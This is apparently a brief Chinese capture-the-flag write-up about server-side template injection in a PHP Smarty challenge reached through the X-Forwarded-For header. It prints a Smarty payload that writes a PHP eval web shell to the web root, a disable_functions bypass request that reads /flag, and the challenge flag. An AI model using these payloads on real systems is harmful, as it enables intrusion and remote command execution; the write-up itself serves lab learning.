# smarty

> flask ssti注入

## 思路分析

> 打开网址,提示有2个接口,一个是查ip的,一个查X-Forwarded-For的.查X-Forwarded-For时可控制参数,怀疑此处存在模版注入,尝试{{1+2}},返回3,此处的确存在ssti漏洞.试python flask,报错了,根据题目关键字smarty猜测是php smarty模版注入.写入shell,用蚁剑连接后,发现不能跨越目录,使用disable_function插件绕过得到flag.

## payload

> {if file_put_contents('/var/www/html/shell.php','<?php eval($_POST[cmd]);')}{/if}

> /bypass_disablefunc.php?cmd=cat /flag&outpath=/tmp/tmpfile&sopath=/var/www/html/bypass_disablefunc_x64.so 

## flag

> flag{6f96cfdfe5ccc627cadf24b41725caa4}

## 参考

> https://www.freebuf.com/articles/web/192052.html